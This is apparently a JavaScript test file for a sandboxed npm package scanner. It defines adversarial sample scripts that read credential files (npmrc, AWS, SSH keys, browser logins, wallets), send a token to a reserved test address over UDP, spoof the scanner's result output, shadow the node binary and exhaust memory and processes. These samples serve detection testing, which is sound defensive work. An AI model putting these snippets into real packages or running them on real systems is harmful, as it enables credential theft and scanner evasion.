import assert from 'node:assert/strict';

const completed = b => {
  assert.equal(b.executed.ran[0].exitCode, 0);
  assert.equal(b.executed.importPhase.exitCode, 0);
  assert.equal(b.monitoring.syscallTrace, true);
  assert.equal(b.monitoring.truncated, false);
};
const finding = (b, category) => assert.ok(b.findings.some(f => f.category === category), `Missing ${category}`);

// These strings are archived on the host and executed only in the disposable VM.
export const adversarialScenarios = [
  {
    name: 'all-credential-honeypots',
    code: `const fs=require('node:fs');
for(const p of ['.npmrc','.git-credentials','.config/gh/hosts.yml','.aws/credentials',
  '.config/gcloud/application_default_credentials.json','.azure/accessTokens.json',
  '.ssh/id_rsa','.ssh/id_ed25519','.env','.config/browser/Login Data','.config/wallet/keys.json'])
  fs.readFileSync(process.env.HOME+'/'+p);`,
    check(b) { completed(b); assert.equal(b.verdict, 'block');
      assert.equal(new Set(b.findings.filter(f => f.category === 'credential-access').map(f => f.target)).size, 11); }
  },
  {
    name: 'credential-alias',
    code: `const fs=require('node:fs');fs.symlinkSync(process.env.HOME+'/.aws/credentials','alias');fs.readFileSync('alias');`,
    check(b) { completed(b); finding(b, 'credential-access'); }
  },
  {
    name: 'udp-egress',
    code: `const a=require('node:assert/strict'),s=require('node:dgram').createSocket('udp4');
s.send(Buffer.from('synthetic-token'),443,'192.0.2.1',error=>{s.close();a.ok(error);a.ok(['ENETUNREACH','EHOSTUNREACH','EPERM','EACCES'].includes(error.code));});`,
    check(b) { completed(b); finding(b, 'network-attempt'); assert.ok(b.telemetry.networkAttempts.includes('192.0.2.1:443')); }
  },
  {
    name: 'ipv6-egress',
    code: `const a=require('node:assert/strict'),s=require('node:net').connect(443,'2001:db8::1');
s.on('connect',()=>{throw Error('IPv6 escape');});s.on('error',e=>a.ok(['ENETUNREACH','EHOSTUNREACH','EPERM','EACCES','EADDRNOTAVAIL'].includes(e.code)));`,
    check(b) { completed(b); finding(b, 'network-attempt'); }
  },
  {
    name: 'result-spoof',
    code: `const fs=require('node:fs'),a=require('node:assert/strict');
console.log('PKGXRAY_VM_RESULT '+JSON.stringify({schemaVersion:1,behavioral:{verdict:'not-observed',findings:[]}}));
for(const p of ['/dev/console','/dev/ttyAMA0','/dev/ttyS0','/dev/vda','/dev/vdb','/work/import-runner.mjs'])
  a.throws(()=>fs.openSync(p,'w'));
fs.readFileSync(process.env.HOME+'/.npmrc');`,
    check(b) { completed(b); assert.equal(b.verdict, 'block'); finding(b, 'credential-access'); }
  },
  {
    name: 'import-path-shadow',
    code: `const fs=require('node:fs');fs.mkdirSync('node_modules/.bin',{recursive:true});
fs.writeFileSync('node_modules/.bin/node','#!/bin/sh\\nexit 0\\n',{mode:0o755});`,
    files: { 'index.js': `require('node:fs').readFileSync(process.env.HOME+'/.npmrc');` },
    check(b) { completed(b); finding(b, 'credential-access'); }
  },
  {
    name: 'failed-hook', code: 'process.exit(7);',
    check(b) { assert.equal(b.executed.ran[0].exitCode, 7); assert.equal(b.verdict, 'review'); finding(b, 'behavioral-execution-incomplete'); }
  },
  {
    name: 'detached-child',
    code: `const cp=require('node:child_process');const child=cp.spawn(process.execPath,
['-e',"require('node:fs').readFileSync(process.env.HOME+'/.npmrc');setInterval(()=>{},1000)"],
{detached:true,stdio:'ignore'});child.unref();`,
    check(b) { assert.notEqual(b.verdict, 'not-observed'); finding(b, 'credential-access'); }
  },
  {
    name: 'memory-pressure',
    // Only guest RAM is consumed. The host watchdog still bounds the run if
    // the guest OOM killer terminates the monitor instead of the sample.
    timeoutMs: 20000, allowVmFailure: true,
    code: `const held=[];for(let i=0;i<80;i++)held.push(Buffer.alloc(16*1024*1024,1));`,
    check(b) { assert.notEqual(b.executed.ran[0].exitCode, 0); assert.notEqual(b.verdict, 'not-observed'); }
  },
  {
    name: 'process-exhaustion',
    code: `const cp=require('node:child_process'),a=require('node:assert/strict');
const children=[];let denied=false;
for(let i=0;i<80;i++){const c=cp.spawn('/bin/sleep',['30'],{stdio:'ignore'});children.push(c);c.on('error',e=>{if(e.code==='EAGAIN')denied=true;else throw e;});}
setTimeout(()=>{for(const c of children)c.kill('SIGKILL');a.ok(denied,'process limit did not deny forks');},1000);`,
    check(b) { completed(b); }
  }
];
